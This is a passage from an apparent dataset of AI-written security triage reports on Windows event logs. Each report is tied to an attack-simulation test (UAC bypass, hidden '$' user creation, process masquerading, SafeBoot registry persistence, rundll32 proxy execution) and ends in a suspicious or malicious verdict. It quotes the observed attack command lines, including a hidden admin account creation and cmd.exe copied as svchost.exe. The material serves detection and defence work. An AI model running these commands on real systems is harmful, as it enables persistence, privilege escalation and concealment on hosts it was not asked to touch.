   - Regular system processes like `sc.exe`, `taskhostw.exe`, and `svchost.exe` run under the `SYSTEM` account, which usually indicates routine maintenance and system operations. 

2. **Security Logs**:
   - There are several logons with LogonType 5, which indicates a service logon. These events can be expected on a server as services start and stop.
   - There are events related to privilege assignment (`EventID 4672`), showing high-level privileges being assigned, which is typical for the `SYSTEM` user but should be monitored for any misuse.
   - The logs also showed authentication package actions against a Microsoft Account, but these returned unsuccessful status (ReturnCode: `3221226021`), which indicates access issues or misconfigurations with Microsoft Account credentials.

3. **Other Logs**:
   - The application and system logs do not reveal any immediate concerns. A log entry indicates that Windows Defender is active and running. This is a positive sign in terms of endpoint protection being in place.

**Assessment**:
- The execution of `wevtutil.exe` and the registry modification using `cmd.exe` and `reg.exe` could be considered **SUSPICIOUS** activities. These actions are common in scenarios involving attempts to tamper with event logs or maintain persistence on a compromised system. However, there is not enough evidence to conclusively determine these actions as outright malicious without additional context.

**Suggested Actions**:
- Conduct a thorough investigation into the context and intent of the `wevtutil.exe` and `cmd.exe` executions with `reg.exe`. Consider reviewing the user's access rights and verifying if any unauthorized registry keys or notable anomalies exist.
- Perform a security audit for `SERVER002`, focusing on recent changes or unauthorized administrative actions that might suggest elevated persistence techniques.
- Monitor the network for any unusual traffic corresponding to the affected user accounts and processes.
- If possible, conduct an integrity check of the registry and system files to ensure no adverse modifications were made.

Final Resolution: **SUSPICIOUS** - The identified activities need further investigation to rule out potential maliciousness."
Disable Windows Remote Desktop Protocol,"Upon reviewing the provided logs, several key observations and assessments can be made:

1. **Service Stops and Misconfigurations**:
   - In the Application logs, the ""edgeupdate"" service stopped twice (EventRecordID 2386 and 2387), which could be normal if the service was updated or encountered a minor issue. However, frequent stops might need further scrutiny if they continue repetitively.
   - In Sysmon logs, there's a command (cmd.exe with ProcessId 6240) attempting to modify the registry key to deny remote terminal service connections: `""cmd.exe"" /c reg add ""HKLM\\System\\CurrentControlSet\\Control\\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 1 /f`. Tampering with such keys could indicate an attempt to modify remote access capabilities, which is concerning.

2. **Respect to Edge Update Activity**:
   - The numerous operations involving Microsoft Edge Update processes, including service start, updates, and registrations, appear as expected scheduled activities from legitimate Edge update mechanisms. This is evident in various events with descriptions related to Microsoft Edge Updater occurring at a system integrity level, e.g., EventID 1 from Sysmon logs. This activity is marked by Pattern where processes run under ""NT AUTHORITY\\SYSTEM,"" indicating legitimate system operations.

3. **Process Execution**:
   - In the Sysmon logs, execution of processes like `C:\Windows\System32\whoami.exe` and `conhost.exe` (e.g., EventRecordID 17946 and 17947) under the integrity level ""High"" by the user SERVER002\admin_test, regularly reflect administrator account activity which may not be alarming alone but should match expected admin tasks.
   - Additionally, operations of `whoami.exe`, `hostname.exe` also indicate general administrative inquiries about the system state without suspicious command-line arguments.

4. **Time Anomalies**:
   - The logs also include time shifts, specifically in the System logs (EventID 1 by Kernel-General) and Security logs (EventID 4616 by Security Auditing) indicating adjustments of system time backwards by several seconds. While such shifts may signify valid synchronization activities with external time sources, it is worth confirming legitimate intent.

---

### Summary and Resolution:

- **Suspicious (SUSPICIOUS)**:
  - The overriding Command Line alterations on terminal service connections (ProcessId 6240) introduces a risk area that merits further investigation. Such modifications can potentially alter administrative access remotely in non-obvious ways.
  - Time discrepancies could be a red herring or part of a synchronization effort but need validation to exclude inconsiderate engine manipulations.

### Recommended Actions:
- **Verify Modifications**: Confirm if registry modifications were part of authorized configurations, perhaps by intended security policies or project requirements.
- **Monitor and Validate**: Track any subsequent anomalies associated with service stoppages and time sync deviations.
- **Conduct Administrator Account Review**: Validate recent actions against intended admin behavior expectations, particularly involving registry or service changes.

These insights should guide targeted actions while monitoring any further developments."
Headless Browser Accessing Mockbin,"Upon analyzing the Windows event logs provided, several observations of interest were identified and assessed for potential malicious activity:

### Analysis of Logs:

1. **Time Change Events**:
   - The logs contain multiple instances of Event ID 4616 (System time was changed). These events are typical on systems and could be related to services or updates, and the processes involved are Windows system processes. However, repetitive or unexpected changes in system time can sometimes be a red flag indicating tampering, potentially related to anti-forensics.

2. **Sensitive Privileges Assigned**:
   - Events with ID 4672 show that the SYSTEM account was assigned multiple high-value privileges. This is a common, benign behavior for the SYSTEM account, which is a core system identity with extensive privileges by default.

3. **Logon Events**:
   - There are multiple instances of Event ID 4624 (An account was successfully logged on) indicating SYSTEM account activity, primarily with logon type 5 (service). This is characteristic of normal system operations where services are starting or logging in automatically.

4. **Commands Execution via PowerShell**:
   - PowerShell logs show execution of commands (EventID 600), such as checking INF files via a command that iterates through them. PowerShell's ""ExecutionPolicy Restricted"" significantly limits execution, which aligns with standard security practices. Although executing PowerShell scripts can be suspicious, the content here doesn't directly indicate malicious intent. However, PowerShell is commonly used in attacks due to its powerful scripting capabilities.

5. **Process Creation Events (Sysmon Logs)**:
   - Several benign system processes are running and interacting normally, including Microsoft Edge updates. However, there is a `cmd.exe` process launching `chrome` in headless mode with a URL. This can be suspicious, especially without context, as it might indicate automated browsing or data exfiltration attempts.

6. **Credential Searches (Event ID 5379)**:
   - The logs show unsuccessful attempts to read credentials with Event ID 5379. The repeated failure with a specific return code could suggest unauthorized attempts to access credential information, even if unsuccessful.

7. **Miscellaneous Activity**:
   - Activity involving `svchost.exe`, `taskhostw.exe`, and other system processes mostly appear routine but includes a process initiated by `CompatTelRunner.exe`, part of Microsoft's telemetry, sometimes flagged in privacy-conscious reviews but not inherently malicious.

### Conclusion:

- **Resolution**: **SUSPICIOUS**
  
  There are no explicit indicators of malicious activity, such as known attacks or confirmed unauthorized changes. The operations seen in the logs, such as the PowerShell command executions and failed credential reading, might need further investigation if they were unexpected or occur without legitimate administrative action.

### Guidance to Address Suspicion:

- **Further Investigation**: Verify the legitimacy of the `cmd.exe` process launching with `chrome` headless and review any associated network traffic.
  
- **Understand Context**: Correlate these logs with other systems and user activity data to confirm their benign nature.
  
- **Monitor and Alert**: Implement stricter monitoring on unusual process executions or unexplained time changes.
  
- **Security Hygiene**: Continue to apply standard security practices, including ensuring systems are promptly patched and security configurations are applied consistently. 

This assessment remains open to reevaluation with additional context or supporting logs beyond those provided."
Bypass UAC using ComputerDefaults (PowerShell),"### Detailed Analysis of the Logs

#### Application Log
- **Microsoft-Windows-Security-SPP**: This is related to the Software Protection Platform Service. There is an event indicating a license validation (Event ID: 16384), which is routine and typically benign.
- **SecurityCenter**: Repeated logs indicating Windows Defender is in the ""ON"" state. This suggests that Windows Defender is active and functioning properly, which is a normal and expected behavior.
- **edgeupdate**: Logs related to the service stop (Event ID: 0) for edgeupdate. This could be a routine operation, especially if an update or maintenance was scheduled.

#### Windows PowerShell Log
- PowerShell commands are executed with actions like creating and setting registry keys (`HKCU:\software\classes\ms-settings\shell\open\command`), altering DelegateExecute property, and a subsequent execution of `ComputerDefaults.exe` with `cmd.exe` set as default. This sequence is indicative of a common UAC (User Account Control) bypass technique using the ""fodhelper"" exploit to escalate privileges. This is a well-known tactic used by attackers to gain elevated permissions and is considered a malicious activity.

#### Sysmon Log
- Multiple executions of system utilities (`wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`). While several are legitimate for administrative tasks, their timing and rapid succession can indicate scripted automation, often used in penetration tests or malicious scripts.
- The execution of `powershell.exe` with similar command details shown in PowerShell logs reinforces potential malicious intent related to registry manipulation and privilege escalation.
- Logs show many executions related to updates and Windows' internal processing, like `SecurityHealthService.exe`, `svchost.exe`, `MicrosoftEdgeUpdate.exe`. These appear to be part of regular software maintenance, updating processes by Microsoft Edge Update, and do not inherently indicate malicious behavior.

#### System Log
- Logs related to kernel process activities and time service adjustments. These appear standard for system operations managing services and time synchronization, which is not indicative of malicious behavior.

#### Security Log
- **Event ID 4624**: Successful logon with SYSTEM privileges via Advapi, which usually indicates a service-related logon. 
- **Event ID 4672**: Special privileges assigned to new logon, typical for SYSTEM account operations.
- **Event ID 4616**: Indicates time change events, often linked to time synchronization processes.

### Assessment of the Situation
The most concerning set of events arise from the PowerShell log, suggesting a potential UAC bypass attempt. The registry modifications and invocation of `cmd.exe` through `ComputerDefaults.exe` indicate an attempt to escalate privileges, a hallmark of malicious attacks.

The Sysmon logs corroborate these activities by showing PowerShell and other command utilities executing in a pattern consistent with scripted or automated actions to manipulate the system without user consent. 

### Resolution
The logs present clear indicators of potentially malicious activities, particularly focusing on the PowerShell events indicative of privilege escalation attempts.

**Decision: MALICIOUS**

### Guidance on How to Proceed
1. **Immediate Response**: Quarantine the affected machine to prevent further compromise or lateral movement within the network.
2. **Investigation**: Conduct a thorough investigation into the root cause and extent of the breach. Analyze any related network or file system activity.
3. **Remediation**: Reverse the unauthorized registry changes. Verify and enhance endpoint security measures and policies.
4. **Awareness**: Review logs and events regularly for similar patterns and reinforce staff awareness about common exploitation techniques.
5. **Patch and Update**: Ensure all systems are updated with the latest security patches and that UAC settings are correctly enforced to avoid UAC bypasses."
Masquerading - windows exe running as different windows exe,"Upon analyzing the provided Windows event logs, there are some indicators of potential compromise that stand out, particularly in the Sysmon and PowerShell logs.

1. **PowerShell Activity with Unusual Command-Line**:
   - The PowerShell log entries include the use of a command to copy `cmd.exe` as `svchost.exe` in the Temp directory and execute it, followed by terminating the process. This behavior can be associated with malicious activities like malware or scripts attempting to disguise or execute unauthorized processes.
   - EventID `1043`, `1044`, `1045`, etc., contain a repeated command: 
     ```powershell
     powershell.exe & {copy \""$env:ComSpec\"" ($env:TEMP + \""\\svchost.exe\"")\
     $mydata_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\\svchost.exe\"")).Id\
     Stop-Process -ID $mydata_003}
     ``` 
     This activity is suspicious as it involves potential process masquerading and process injection tactics often observed in malware execution.

2. **Process Creation and Execution Logs**:
   - In the Sysmon log, there is a series of `whoami.exe` and `hostname.exe` executions by the user `SERVER002\\admin_test`, which compares to regular reconnaissance activity.
   - Additionally, the PowerShell execution initiating the `svchost.exe` from a non-standard directory aligns with some of the logged processes having `svchost.exe` launched from a Temp directory, which is unusual and typically a sign of potentially malicious activities.

3. **Use of Legitimate Tools for Potential Malicious Purposes**:
   - Using `wevtutil.exe` to export event logs is a legitimate action when performed by administrators. However, if unauthorized, it can indicate attempts to cover tracks.
   - Sysmon logs show entries for multiple uses of `wevtutil.exe` by the user `SERVER002\\admin_test`, which, in isolation, might seem benign but adds to the pattern of suspicious behavior when combined with the PowerShell activity.

### Conclusion:
The log data suggests activities that warrant further scrutiny, particularly centered around the suspicious PowerShell script execution that copies `cmd.exe` to `svchost.exe` and executes it. This behavior, along with the use of system tools like `wevtutil.exe` in close succession, could indicate evasive tactics in play.

**Resolution: SUSPICIOUS**

### Recommended Actions:
- **Conduct a full forensic investigation** of the user `admin_test`'s activities and the corresponding PowerShell and Sysmon logs.
- **Scan for any malicious or unexpected files** within the involved directories, especially focusing on `%TEMP%` paths.
- **Review user permissions and access logs** to determine if credentials have been compromised or misused.
- Deploy a comprehensive antivirus or endpoint monitoring solution to ensure there are no remaining traces of potentially harmful files or executed processes.
- **Educate personnel** on best practices regarding PowerShell script execution and securing scripting environments on critical servers."
WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,"**Analysis of Logs for Malicious Activity**

Upon reviewing the provided Windows event logs for the Windows host named ""Server002,"" I have identified several points of interest:

1. **Windows PowerShell Log**
   - Multiple events involve the execution of PowerShell with command lines: 
     ```
     powershell.exe & {Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_VBScript.msi' }}
     ```
     - The use of `Invoke-CimMethod` and installation of a MSI file from a temporary directory is generally unorthodox and may indicate the installation of a potentially unauthorized or suspicious application.
   - Another PowerShell command observed was:
     ```
     C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -Command Write-Host VBScript executed me; exit
     ```
     - The `-nop` (no profile) flag and direct command execution suggest this was likely executed through a script or a potentially malicious VBScript attempting to obfuscate its execution.

2. **Application Log**
   - MsiInstaller events reveal the installation of a package:
     ```
     C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_VBScript.msi
     ```
     - The installation path being a temporary folder and the lack of known verification about the legitimacy of this package could imply this is unwanted software or a malware dropper.

3. **Sysmon Log**
   - Frequent creation of new processes by the user `SERVER002\\admin_test` ranging from PowerShell, console hosts, `wevtutil.exe`, `conhost.exe`, and `msiexec.exe`. These processes can potentially be utilized to hide malicious activities or perform lateral movements within the system.
   - There is a pattern of processes that typically associate with process execution and environmental inquiries which might suggest reconnaissance actions by an attacker.

**Assessment and Resolution**

- **Suspicious Indicators**:
  - Use of PowerShell with obfuscation-like behavior and installation processes executing from non-standard directories raise red flags for potential unauthorized installations or scripting attacks.
  - The presence of unexpected VBScript execution implies potential misuse or exploitation.
  
- **Potential Compromise Indicators**:
  - Invocation of system tools and scripting environments (e.g., PowerShell) without clear, legitimate administrative activity known may be indicative of attempts to deploy unwanted software, collect data, or prepare the environment for further exploitation.

**Conclusion**

Resolution: **SUSPICIOUS**

The activities observed are suspicious primarily due to the unconventional use of PowerShell commands, the installation from temporary directories, and indications of automation possibly through scripts that were executed in rapid succession. This requires further investigation to determine if they were authorized actions and correlate these events with any known good administrative tasks or recent legitimate installations. A deep dive including malware scanning, checking for unusual outbound network connections, and reviewing user activities for the `admin_test` account is advised. Contacting users or reviewing ticket systems for verifying planned activities is also recommended."
UACME Bypass Method 23,"### Analysis of the Windows Event Logs

#### Application Log:
1. **Windows Defender Status**:
   - The Application log shows multiple entries confirming that Windows Defender is active and operating correctly on the system. 
   - These logs are benign and indicate that no direct changes or deactivation of the security product have been observed.

#### Sysmon Log:
1. **Command-Line Executions**:
   - **Suspicious Execution**: A command was executed using `cmd.exe` that accesses what appears to be a file path within a `Temp` directory and performs a command to echo this path. The path includes the file `23 Akagi64.exe`, which is atypical for standard operations.
   - This execution method is often associated with file execution masking or potentially misused/rogue executables. `Akagi` is notably related to ""UACMe"", an open-source project for bypassing User Account Control in Windows systems, suggesting potential privilege escalation activity.

2. **Multiple Initiations of Conhost and WEVTUtil**:
   - There are multiple executions of `conhost.exe` and `wevtutil.exe` under the same ""admin_test"" user at high integrity level, around the same time the suspicious command line was logged:
     - `conhost.exe`: Often used to deliver command commands to the command shell in the background.
     - `wevtutil.exe`: A legitimate utility used for operations on Windows Event Logs, but misused can indicate log clearing or tampering.

3. **Use of `hostname.exe` and `whoami.exe`**:
   - These commands are being executed using the `high integrity level` associated with the ""admin_test"" user, often used during post-exploitation reconnaissance to confirm environment details and enumerate currently logged on users.

4. **Microsoft Edge Update Processes**:
   - The log reflects Microsoft Edge updates occurring, which appear to be legitimate system operations.

#### Assessment of Threats:
- The execution of the `23 Akagi64.exe` in the `Temp` directory suggests an unauthorized execution attempt and potential privilege elevation strategy. 
- Commands such as `whoami` and `hostname` executed by an admin-level account in close proximity to a potentially malicious command may represent additional reconnaissance or confirmation of successful unauthorized actions without detection.

### Guidance and Resolution:
Given these logs contain signals indicative of potential unauthorized activities, particularly the presence and execution of potentially malicious `23 Akagi64.exe`, we cannot conclusively categorize the situation as benign without further context or verification regarding this executable.

#### **Resolution: SUSPICIOUS** 
- **Immediate Action**:
  - **Further Investigation Needed**: Verify the nature and source of `23 Akagi64.exe`. Conduct a full malware scan focusing on the `Temp` directory and network-wide scans for anomalies.
  - **Log Monitoring**: Increase logging around command executions and user actions for proactive detection.
  - **Contain and Protect**: If unauthorized activity is confirmed, isolate the affected system and ensure it is removed from critical network access until remediation is complete.

- **Additional Recommendations**:
  - Assess the use of valid tools such as `wevtutil` and monitor for improper usage.
  - Check for any additional administrative users added to the system that should not be present and review privilege access levels.
  - Conduct user awareness training to understand the risks associated with unauthorized or suspicious files and execution methods. 

This assessment identifies potentially dangerous behaviors that warrant further investigation to protect the system's security and integrity."
Create a Hidden User Called $,"Given the examination of the provided Windows event logs for `Server002`, we can summarize the following analysis:

### Suspicious Findings:
1. **Account Creation and Manipulation:**
   - EventID 4720 and 4738 indicate an account (`$`) was created and enabled with the `admin_test` user acting as the subject. The use of a `$` symbol for an account name is unusual and often associated with temporary or hidden accounts.
   - Event 4728 shows that a user was added to a privileged group, which typically requires administrative privileges and can be indicative of lateral movement or privilege escalation.

2. **Process Execution:**
   - Sysmon EventID 1 logged the execution of commands with `cmd.exe`, `net.exe`, and `net1.exe` that appear to be creating a user and adjusting its settings. The command used was: 
     ```
     ""cmd.exe"" /c net user $ file123! /add /active:yes
     ```
   - The creation and activation of an account within a high-integrity process context (`admin_test`) without any clear operational justification are highly suspicious.

3. **Usage of System Processes:**
   - Frequent use of system utilities like `wevtutil.exe` and `conhost.exe` in a short period, as seen in the Sysmon logs, may sometimes indicate reconnaissance or manipulation of event logs.

4. **Privilege Setting and Group Manipulation:**
   - EventID 4732 shows alterations of group membership under the control of `admin_test`, which coincides with unusual privilege adjustments documented in EventID 4724. This activity is aligned with manipulation attempts typical in a threat actor's modus operandi. 

### Assessment:
- The logs exhibit a series of events characteristic of account manipulation, privilege escalation, and potential preparation for persistent access, all occurring within an extremely tight timeframe and under the same user context (`admin_test`).
  
### Conclusion:
Based on the identified activities, there are clear indicators of potential malicious behavior:
- Creation of suspiciously named accounts.
- Execution of commands typically used in unauthorized user management.
- Group and privilege manipulations that lack a clear legitimate purpose.

### Recommended Resolution:
- **MALICIOUS:** The activities logged indicate potential unauthorized administrative actions consistent with malicious behavior. Further immediate investigation and mitigation steps are necessary.

### Recommended Actions:
- Isolate the affected machine to prevent further lateral movement or data exfiltration.
- Review and terminate the new user accounts (`$`) created and any unauthorized privileges granted.
- Conduct a thorough forensic analysis of `Server002` to determine the extent of the compromise.
- Check for persistence mechanisms not evident in the logs, such as tasks or services.
- Analyze similar event patterns in other systems to assess a broader impact.
- Strengthen monitoring and detection mechanisms to capture similar events in the future."
WinPwn - UAC Bypass DiskCleanup technique,"Based on the provided log entries, here's an analysis identifying potential indicators of compromise and assessing the threat level:

### Analysis of Logs

**1. Security Log:**

- The provided logs (EventID: 4616) involve a time change event. This frequently happens in a legitimate context, typically involving svchost.exe. However, this can also be a tactic used in time stomping attacks, used to manipulate timestamps to avoid detection.

**2. Windows PowerShell Log:**

- The PowerShell log entries show a suspicious execution command. PowerShell is being used to download and execute a script from a remote URL (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). This behavior is very suspicious as it may indicate the execution of potentially harmful scripts downloaded from a remote server, which is commonly seen in malware and phishing attacks.

**3. System Log:**

- The events here generally appear standard for system operations, except for the time adjustments. The kernel and time service logs (EventID: 1, 24, 35) are common for system processes.

**4. Application Log:**

- Both Windows Defender status and Software Protection Platform events seem to indicate normal system protection activities. Windows Defender is actively running without any alerts for detected threats, which might mean it did not detect any malicious activity—or was potentially circumvented.

**5. Sysmon Log:**

- These logs exhibit multiple process creations involving PowerShell, cmd.exe, whoami.exe, and utilities like conhost.exe and wevtutil.exe initiated by `admin_test`. The use of PowerShell to invoke web clients and download scripts is typical of malicious activity.

### Assessment

- **Suspicious PowerShell Activity:** The PowerShell log entries, indicating that scripts are being downloaded and executed from external sources, are a major red flag.
  
- **Potential Process Anomalies:** Use of PowerShell to launch cmd.exe and disk cleanup, coupled with network downloads may indicate potential data exfiltration or malware execution.

### Conclusion

The logs clearly show suspicious activity with the PowerShell script being directly downloaded from an online repository, suggesting potential system compromise or steps towards compromise.

### Resolution

- **MALICIOUS:** Based on the identified PowerShell execution which potentially introduces a dangerous script into the host environment from an untrusted remote source, I would conclude that the activity is Malicious.

### Recommended Actions

- **Immediate Incident Response:** Disconnect the machine from the network to prevent further potential spread or data exfiltration.
  
- **Forensic Investigation:** Further analyze the downloaded script and any modifications made by it. Investigate the corresponding log for any associated IP addresses or external connections.

- **Enhanced Monitoring:** Increase monitoring on all outbound traffic particularly focussing on similar PowerShell activities on other hosts in the network.

- **System Scan and Remediation:** Run a complete anti-virus and malware scan. Ensure any identified threats are contained and removed.

- **Review and Update Policies:** Implement stronger PowerShell execution policies and restrict Internet access for unnecessary processes or accounts."
Copy and Modify Mailbox Data on Windows,"Upon reviewing the provided logs, I will outline my analysis focusing on identifying any suspicious behavior or potential indicators of malicious activity:

### Analysis

#### Application Log
- **EventID 16384**: This log entry is related to the ""Software Protection Platform Service"" with no immediate indications of compromise or suspicious activity. It seems to log a synchronization or rule evaluation event.

#### PowerShell Log
- **EventID 600**: Logs show PowerShell activity with the creation of a directory and files copied to it. This activity includes copying files from a directory to a newly created directory and modifying contents.
    - The PowerShell command being used is: `New-Item`, `Get-ChildItem`, and `Add-Content`. Although these appear benign in isolation, scripting activity that modifies files in user directories can sometimes be associated with attempts to mask activities or stage data exfiltration; this warrants further scrutiny because of potential misuse.

#### Security Log
- **EventID 4616**: Indicates system time change events; typically related to system synchronization activities, particularly with `svchost.exe` involved. These logs do not directly indicate malicious activity but warrant context consideration to ensure that the time changes are legitimate and expected.

#### Sysmon Log
- **EventID 1 & 5**: Contains a series of process creation and termination logs. The repeated execution of `wevtutil.exe`, `conhost.exe`, and `PowerShell.exe` indicates typical system events but should be further validated:
    - Multiple invocations of `PowerShell.exe` with directory-related operations closely match the commands observed in PowerShell logs indicating similar or continued activities.
    - Processes like `wevtutil.exe` (used for managing Windows event logs) being run multiple times could potentially point to log tampering if not explained by legitimate admin activity.
  
- **Integrity Level**: The processes run under the admin user `SERVER002\admin_test` with high integrity. This suggests high privilege actions, which align with administrative operations; however, it also highlights potential for greater impact if leveraged by an attacker.
  
- **Service Executions**: Logs of `sppsvc.exe`, `WmiPrvSE.exe`, `TiWorker.exe`, `TrustedInstaller.exe`, and `svchost.exe` show system service actions that are expected in normal operation.

### Conclusion

Based on the observations:
1. The PowerShell activities related to directory manipulation and content modification are potentially benign but warrant additional investigation to confirm legitimacy. This could be part of a maintenance script or a data staging activity.
   
2. The repetitive high-privilege usage of PowerShell commands, ‘wevtutil.exe’ and potential opportunity for misuse or lateral thinking surrounding these actions make the overall log activities **SUSPICIOUS**.

### Resolution: **SUSPICIOUS**

### Guidance
- Confirm whether the PowerShell script execution is part of a routine or a legitimate administrative task.
- Verify if `wevtutil.exe` usage was related to normal event log management or part of system administration.
- Investigate the source and reason for the PowerShell command sequence within the user directories.
- Escalate to incident response if any queries on use cases appear unjustified or indicative of misuse."
Windows Add Registry Value to Load Service in Safe Mode without Network,"### Analysis of Logs:

#### System Log:
1. **Time Synchronization Events (EventID 24 & 1)**:
   - Multiple entries are recorded for time synchronization, where `svchost.exe` is modifying system time by small increments (~1 second).
   - While frequent time changes can occasionally suggest tampering, this behavior alone is often related to regular time synchronization activities performed by Windows Time Service (w32time) and is benign.

2. **Time Service Source Selection (EventID 35)**:
   - The system is syncing time with `time.windows.com`, which is a legitimate and normal time server for Windows devices.

#### Application Log:
1. **Edge Update Service Stopping**:
   - Two events indicate the stopping of the `edgeupdate` service. This isn't inherently suspicious as this can occur during normal update processes.

2. **Software Protection Platform (SPP) Service**:
   - Typical entries related to Software Licensing, no immediate indication of suspicious activity.

#### Sysmon Log:
1. **Process Creation**:
   - Frequent execution of processes such as `cmd.exe`, `conhost.exe`, `reg.exe`, and `wevtutil.exe` by the user `SERVER002\admin_test`.
   - The command line shows modifications to the registry using `reg.exe` to alter SafeBoot configurations, which stands out as **suspicious**. Such changes to `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` are often associated with persistence techniques employed by malware.
   - Use of `whoami.exe` and `hostname.exe` is typically indicative of enumeration activity.

2. **Microsoft Edge Update Activities**:
   - Multiple instances of `MicrosoftEdgeUpdate.exe` and related processes running as the `NT AUTHORITY\SYSTEM` user.
   - Though numerous, these activities seem consistent with typical application update sequences, involving self-invocations and COM server registrations.

#### Security Log:
1. **Time Change Auditing (EventID 4616)**:
   - Correlates with the System log entries where system time is altered. As noted earlier, these likely relate to regular time synchronization operations.

### Assessment:

- The logs predominantly display activities typical of system operations and scheduled updates. However, the use of `cmd.exe` to modify registry settings in SafeBoot mode raises a red flag. Typically, non-standard registry modifications, especially related to SafeBoot, can be exploited for persistent malware installation.

### Conclusion: **SUSPICIOUS**

### Guidance on How to Proceed:

1. **Further Investigation**:
   - Verify the intent and necessity of the `SafeBoot` registry changes. Determine if these changes were approved and executed by authorized IT personnel.
   - Investigate the processes around these registry changes: check corresponding user activities, and consider monitoring their network interactions.

2. **Security Audit**:
   - Perform a full antivirus and anti-malware scan of the device.
   - Review user account and group policies to ensure no unauthorized privilege escalation or group membership.

3. **Network Monitoring**:
   - Monitor network traffic from `Server002` for any abnormal outbound connections, especially to known malicious IP addresses or domains.

By taking these steps, you can ascertain the legitimacy of the detected activities and mitigate any potential threats effectively."
Copy and Delete Mailbox Data on Windows,"### Detailed Analysis

#### **1. Windows Event Logs Overview**

- **Application Log**:
  - Two entries related to EdgeUpdate and SPP; these entries appear routine. The EdgeUpdate service stopping is typical during updates, and no suspicious behavior is detected here.
  
- **System Log**:
  - Events mostly pertain to time changes and adjustments. Such changes are often normal system functions associated with daylight saving time adjustments or system synchronization with a time server. Here, the time synchronization involving `time.windows.com` can be considered benign.

- **Security Log**:
  - The logs mainly document time change events associated with `svchost.exe`, which hosts multiple Windows services. No anomalous behavior detected here that points towards any compromise.

#### **2. Sysmon Event Logs Analysis**

- Multiple Sysmon Event IDs are logged, particularly:
  - `EventID 1`: Process creation events.
  - `EventID 5`: Process termination events.

  These logs show consistent records of various processes typically seen during system and application updates, especially Microsoft Edge updates.

  Notably:
  - **Microsoft Edge Update Activity**:
    - Several entries relate to `MicrosoftEdgeUpdate.exe` which seems like an update process. Logs demonstrate not only the service operation but also child processes of Edge Updates. These are frequent and typically benign unless they deviate from documented behavior.
  
  - **wevtutil.exe and conhost.exe Execution by `admin_test`**:
    - `wevtutil.exe` and `conhost.exe` appearing in quick succession operate under the `admin_test` account. This utility is legitimate and typically seen in event log operations. However, the repetitive nature and concentration over a short window suggest possible investigation due to potential abuse for log clearing by malicious actors. 
    - The command-line executions, however, do not show error conditions or abnormal timestamps, lessening the immediate risk perception.

- **PowerShell Activity**:
  - **PowerShell Execution**:
    - A PowerShell session is distinctly logged with a script intending to modify directory content using PowerShell script. Although PowerShell is widely used for administrative purposes, the script’s specific actions are to create, copy, and remove files within the user’s `AppData`. Such actions could be perceived as unusual and should definitely be further investigated to rule out data exfiltration attempts or persistence mechanisms particularly given its timing and specificity.

### **Assessment and Resolution**
- **Threats/Risks** Identified:
  - The wevtutil.exe excessive activity logged may seem suspicious for potential log manipulation.
  - The PowerShell script logged raises suspicion with actions performed in sensitive user directories.
  
#### **Guidance on Proceeding**
- **Immediate Actions**:
  - Perform a detailed audit on `admin_test` user operations, focusing on why PowerShell scripts needed repetitive file operations in `AppData`.
  - Check the integrity of Microsoft Edge-related processes, ensure all are from legitimate sources, potentially involving hash checks or endpoint monitoring reviews.

- **Recommendations**:
  - Monitoring should be continued for Edge Updates and PowerShell sessions, adding additional logging and alert triggers on sensitive directory operations such as those in AppData.
  - Conduct user action reviews and provide additional training if necessary on proper system usage to prevent similar events if discovered after further investigation. 

Based on current evidence, the activities resemble normal legitimate operations with some suspicious configuration particularly stemming from PowerShell activity. Thus, the event log entries warrant deeper inspection which could refine the view of any underlying threats.

**Final Resolution**: **SUSPICIOUS** - warrant more investigation, particularly focused on PowerShell scripts and user activities."
Rundll32 execute command via FileProtocolHandler,"**Detailed Analysis:**

The provided logs come from System, Security, Sysmon, and Application logs. Here is an analysis considering potential indicators of malicious activity:

1. **System Logs:**
   - The system logs primarily indicate normal kernel activities and time synchronization activities. There's an adjustment of system time, which is being handled by the `svchost.exe`, a legitimate system process often used to host multiple Windows services.

2. **Security Logs:**
   - The security logs again show the time synchronization process conducted by `svchost.exe` under the `LOCAL SERVICE` account, consistent with time service updates, which is standard and expected behavior.

3. **Sysmon Logs:**
   - Several key points stand out:
     - There are executions of `whoami.exe` and `hostname.exe` by the `admin_test` user, which might be considered normal if they are part of standard administrative activities.
     - Multiple executions of `wevtutil.exe` by the `admin_test` user, which is used to manage event logs, may need additional context to determine if this is part of legitimate troubleshooting or suspicious activity.
     - Execution of `cmd.exe` with the command line `\""cmd.exe\"" /c rundll32.exe url.dll,FileProtocolHandler calc.exe` indicates an anomalous behavior. Invoking `rundll32.exe` in this context to open `calc.exe` can sometimes be used in testing scenarios or scripted automation but is a known technique used by some malware to execute code.
     - Frequent spawns of `EdgeUpdate` processes also match typical update behavior for applications like Microsoft Edge, and the hashes match known application hashes.

4. **Application Logs:**
   - The application log indicates a service stop, associated with EdgeUpdate processes. This aligns with typical behavior after an update or service task completion.

**Assessment:**
- **Indicator of Compromise:**
  - The execution sequence involving `cmd.exe` and `rundll32.exe` opening `calc.exe` is particularly suspicious, as it can signify misuse of legitimate Windows binaries to execute arbitrary code. This technique is known in the context of ""living off the land"" tactics often used by attackers to avoid detection.

**Resolution: SUSPICIOUS**
 
**Recommendations:**
- **Further Investigation:**
  - Investigate the context and legitimacy of the `cmd.exe` and `rundll32.exe` usage. Determine if they are part of any authorized scripts or automation tasks.
  - Check `admin_test` user activity for any anomalous logins or activities preceding the suspicious events.

- **Mitigation Steps:**
  - Ensure that PowerShell logging is enabled and further monitor for potentially malicious scripts.
  - Conduct threat hunting for any other indicators associated with living-off-the-land techniques.

- **Preventive Measures:**
  - Review and tighten user permissions, especially for administrative accounts.
  - Deploy advanced endpoint protection to detect and respond to unusual command line usage and execution patterns.

Overall, while some aspects of the logs align with typical update processes, the chain involving process executions with `cmd.exe` and `rundll32.exe` should be investigated for potential unauthorized activities."
Msiexec.exe - Execute Local MSI file with embedded VBScript,"Upon reviewing the provided log entries, several aspects indicate potentially suspicious or malicious activity that require further investigation:

1. **PowerShell Execution**: 
